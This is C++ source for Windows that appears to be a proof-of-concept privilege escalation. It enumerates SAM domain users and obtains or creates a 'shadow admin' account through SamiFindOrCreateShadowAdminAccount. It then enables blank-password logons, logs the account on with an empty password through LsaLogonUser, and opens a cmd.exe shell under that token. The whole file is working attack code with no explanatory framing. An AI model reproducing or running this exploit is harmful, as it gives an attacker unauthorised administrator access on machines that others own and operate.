#include "stdafx.h"

HRESULT GetLastHrEx(ULONG dwError = GetLastError());

HRESULT ExecCmd(HANDLE hToken)
{
	WCHAR cmd[MAX_PATH];

	if (GetEnvironmentVariableW(L"ComSpec", cmd, _countof(cmd)))
	{
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		ULONG SessionId = RtlGetCurrentPeb()->SessionId;
		NtSetInformationToken(hToken, TokenSessionId, &SessionId, sizeof(SessionId));
		if (CreateProcessAsUserW(hToken, cmd, const_cast<PWSTR>(L"* /k whoami"), 0, 0, 0, 0, 0, 0, &si, &pi))
		{
			NtClose(pi.hThread);
			NtClose(pi.hProcess);

			return S_OK;
		}
	}

	return GetLastHrEx();
}

#include "sami.h"
//
// MsV1_0SetProcessOption submit buffer - for submitting a buffer
// an call to LsaCallAuthenticationPackage().
//

#define MSV1_0_OPTION_ALLOW_BLANK_PASSWORD      0x01
#define MSV1_0_OPTION_DISABLE_ADMIN_LOCKOUT     0x02
#define MSV1_0_OPTION_DISABLE_FORCE_GUEST       0x04
#define MSV1_0_OPTION_ALLOW_OLD_PASSWORD        0x08
#define MSV1_0_OPTION_TRY_CACHE_FIRST           0x10

typedef struct _MSV1_0_SETPROCESSOPTION_REQUEST {
	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
	ULONG ProcessOptions;
	BOOLEAN DisableOptions;
} MSV1_0_SETPROCESSOPTION_REQUEST, * PMSV1_0_SETPROCESSOPTION_REQUEST;

const volatile UCHAR guz = 0;

NTSTATUS GetLogonSid(_Out_ PSID_AND_ATTRIBUTES LogonSid)
{
	HANDLE hToken;

	if (WTSQueryUserToken(RtlGetCurrentPeb()->SessionId, &hToken))
	{
		NTSTATUS status;

		union {
			PVOID buf;
			PTOKEN_GROUPS ptg;
		};

		PVOID stack = alloca(guz);
		ULONG cb = 0, rcb = 0x100;

		do
		{
			if (cb < rcb)
			{
				cb = RtlPointerToOffset(buf = alloca(rcb - cb), stack);
			}
			status = NtQueryInformationToken(hToken, TokenGroups, buf, cb, &rcb);

		} while (STATUS_BUFFER_TOO_SMALL == status);

		NtClose(hToken);

		if (0 > status)
		{
			return status;
		}

		if (ULONG GroupCount = ptg->GroupCount)
		{
			PSID_AND_ATTRIBUTES Groups = ptg->Groups;
			do
			{
				if (Groups->Attributes & SE_GROUP_LOGON_ID)
				{
					PSID Sid = Groups->Sid;
					if (SECURITY_LOGON_IDS_RID_COUNT == *RtlSubAuthorityCountSid(Sid) &&
						SECURITY_LOGON_IDS_RID == *RtlSubAuthoritySid(Sid, 0))
					{
						LogonSid->Attributes = Groups->Attributes;
						return RtlCopySid(SECURITY_SID_SIZE(SECURITY_LOGON_IDS_RID_COUNT), LogonSid->Sid, Sid);
					}
				}
			} while (Groups++, --GroupCount);
		}

		return STATUS_NO_SUCH_GROUP;
	}

	return GetLastHrEx();
}

NTSTATUS LogonIUser(_In_ PCUNICODE_STRING DomainName, _In_ PCWSTR UserName, _In_ PCWSTR Password)
{
	NTSTATUS SubStatus, status = STATUS_INTERNAL_ERROR;

	UCHAR Sid[SECURITY_SID_SIZE(SECURITY_LOGON_IDS_RID_COUNT)];

	TOKEN_GROUPS LocalGroups = { 1, { Sid } };

	HANDLE LsaHandle;

	union {
		PVOID AuthenticationInformation;
		PMSV1_0_INTERACTIVE_LOGON mil;
	};

	ULONG cb = 0;

	union {
		PVOID buf = 0;
		PWSTR psz;
		ULONG_PTR up;
	};

	int len = 0;

	while (0 < (len = _snwprintf(psz, len, L"%wZ%c%ws%c%ws", DomainName, 0, UserName, 0, Password)))
	{
		if (buf)
		{
			mil->MessageType = MsV1_0InteractiveLogon;
			RtlInitUnicodeString(&mil->LogonDomainName, psz);
			RtlInitUnicodeString(&mil->UserName, psz += wcslen(psz) + 1);
			RtlInitUnicodeString(&mil->Password, psz += wcslen(psz) + 1);

			status = STATUS_SUCCESS;
			break;
		}

		AuthenticationInformation = alloca(cb = sizeof(MSV1_0_INTERACTIVE_LOGON) + ++len * sizeof(WCHAR));
		RtlZeroMemory(mil, sizeof(MSV1_0_INTERACTIVE_LOGON));
		buf = mil + 1;
	}

	if (0 <= status && 0 <= (status = GetLogonSid(LocalGroups.Groups)) &&
		0 <= (status = LsaConnectUntrusted(&LsaHandle)))
	{
		ULONG ulAuthPackage;
		LSA_STRING PackageName;
		RtlInitString(&PackageName, MSV1_0_PACKAGE_NAME);//NEGOSSP_NAME_A
		if (0 <= (status = LsaLookupAuthenticationPackage(LsaHandle, &PackageName, &ulAuthPackage)))
		{
			//////////////////////////////////////////////////////////////////////////
			PVOID ProtocolReturnBuffer = 0;
			ULONG ReturnBufferLength;
			MSV1_0_SETPROCESSOPTION_REQUEST spo = {
				MsV1_0SetProcessOption, MSV1_0_OPTION_ALLOW_BLANK_PASSWORD, FALSE
			};

			status = LsaCallAuthenticationPackage(
				LsaHandle, ulAuthPackage, &spo, sizeof(spo),
				&ProtocolReturnBuffer, &ReturnBufferLength, &SubStatus);

			DbgPrint("MSV1_0_OPTION_ALLOW_BLANK_PASSWORD=%x(%x)\r\n", status, SubStatus);

			if (ProtocolReturnBuffer) LsaFreeReturnBuffer(ProtocolReturnBuffer);

			//////////////////////////////////////////////////////////////////////////
			PVOID ProfileBuffer;
			ULONG ulProfileBufferLen;
			LUID LogonId;
			QUOTA_LIMITS Quotas;
			LSA_STRING lsaOriginName{};
			TOKEN_SOURCE tokenSource{};
			HANDLE hToken;

			if (0 <= (status = LsaLogonUser(LsaHandle, &lsaOriginName, Interactive, ulAuthPackage,
				AuthenticationInformation, cb,
				&LocalGroups,
				&tokenSource,
				&ProfileBuffer,
				&ulProfileBufferLen,
				&LogonId,
				&hToken,
				&Quotas,
				&SubStatus)))
			{
				LsaFreeReturnBuffer(ProfileBuffer);
				status = ExecCmd(hToken);
				NtClose(hToken);
			}
			else
			{
				if (0 > SubStatus)
				{
					status = SubStatus;
				}
			}
		}
	}

	return status;
}

NTSTATUS ExecAdmin(_In_ PCUNICODE_STRING DomainName, SAM_HANDLE DomainHandle, PSID Sid, PULONG pRid)
{
	union {
		PDOMAIN_DISPLAY_USER pdu;
		PVOID Buffer;
	};
	NTSTATUS status;
	ULONG Index = 0, TotalAvailable, TotalReturned, ReturnedEntryCount;
	do
	{
		if (0 <= (status = SamQueryDisplayInformation(DomainHandle, DomainDisplayUser,
			Index, 0x100, 0x10000, &TotalAvailable, &TotalReturned, &ReturnedEntryCount, &Buffer)))
		{
			if (ReturnedEntryCount)
			{
				PVOID buf = Buffer;
				do
				{
					Index = pdu->Index;

					DbgPrint("%u %08X \"%wZ\" \"%wZ\" \"%wZ\"\n",
						pdu->Rid, pdu->AccountControl, &pdu->LogonName, &pdu->FullName, &pdu->AdminComment);

					if (DOMAIN_USER_RID_MAX < pdu->Rid)
					{
						*pRid = pdu->Rid;

						PWSTR AdminName;
						PSID ShadowSid;
						if (0 <= SamiFindOrCreateShadowAdminAccount(Sid, &AdminName, &ShadowSid))
						{
							SamFreeMemory(ShadowSid);
							status = LogonIUser(DomainName, AdminName, L"");
							SamFreeMemory(AdminName);
							break;
						}

					}

				} while (pdu++, --ReturnedEntryCount);

				SamFreeMemory(buf);
			}
		}

	} while (STATUS_MORE_ENTRIES == status);

	return status;
}

NTSTATUS tr4()
{
	NTSTATUS status;

	LSA_HANDLE PolicyHandle;

	LSA_OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) };

	if (0 <= (status = LsaOpenPolicy(0, &ObjectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &PolicyHandle)))
	{
		union {
			PPOLICY_DNS_DOMAIN_INFO ppdi;
			PPOLICY_ACCOUNT_DOMAIN_INFO padi;
			PVOID buf;
		};

		PSID Sid = 0, DomainSid = 0;
		BOOL bInDomain = TRUE;
		PCUNICODE_STRING DomainName = 0;

		if (0 <= (status = LsaQueryInformationPolicy(PolicyHandle, PolicyDnsDomainInformation, &buf)))
		{
			if (DomainSid = ppdi->Sid)
			{
				DomainName = &ppdi->DnsDomainName;
			}
			else
			{
				LsaFreeMemory(buf);
				if (0 <= (status = LsaQueryInformationPolicy(PolicyHandle, PolicyAccountDomainInformation, &buf)))
				{
					DomainSid = padi->DomainSid;
					DomainName = &padi->DomainName;
					bInDomain = FALSE;
				}
			}
		}

		LsaClose(PolicyHandle);

		if (0 <= status)
		{
			ULONG SubAuthorityCount = 0;

			if (DomainSid)
			{
				SubAuthorityCount = *RtlSubAuthorityCountSid(DomainSid);
				ULONG cb = RtlLengthRequiredSid(SubAuthorityCount + 1);
				RtlCopySid(cb, Sid = alloca(cb), DomainSid);

				SAM_HANDLE ServerHandle, DomainHandle = 0;
				PDOMAIN_CONTROLLER_INFOW DomainControllerInfo = 0;
				UNICODE_STRING name, * psn = 0;

				if (bInDomain)
				{
					if (NOERROR != (status = DsGetDcNameW(0, 0, 0, 0, DS_PDC_REQUIRED, &DomainControllerInfo)))
					{
						goto __exit;
					}

					PCWSTR ServerName = 0;
					if (!(ServerName = DomainControllerInfo->DomainControllerAddress))
					{
						ServerName = DomainControllerInfo->DomainControllerName;
					}
					RtlInitUnicodeString(psn = &name, ServerName);
				}

				status = SamConnect(psn, &ServerHandle, SAM_SERVER_LOOKUP_DOMAIN, 0);

				if (DomainControllerInfo)
				{
					NetApiBufferFree(DomainControllerInfo);
				}

				if (0 <= status)
				{
					status = SamOpenDomain(ServerHandle, DOMAIN_READ | DOMAIN_EXECUTE, Sid, &DomainHandle);

					SamCloseHandle(ServerHandle);

					if (0 <= status)
					{
						++*RtlSubAuthorityCountSid(Sid);
						PULONG pRid = RtlSubAuthoritySid(Sid, SubAuthorityCount);

						status = ExecAdmin(DomainName, DomainHandle, Sid, pRid);

						SamCloseHandle(DomainHandle);
					}

				}

			}
		__exit:
			LsaFreeMemory(buf);
		}
	}

	return status;
}
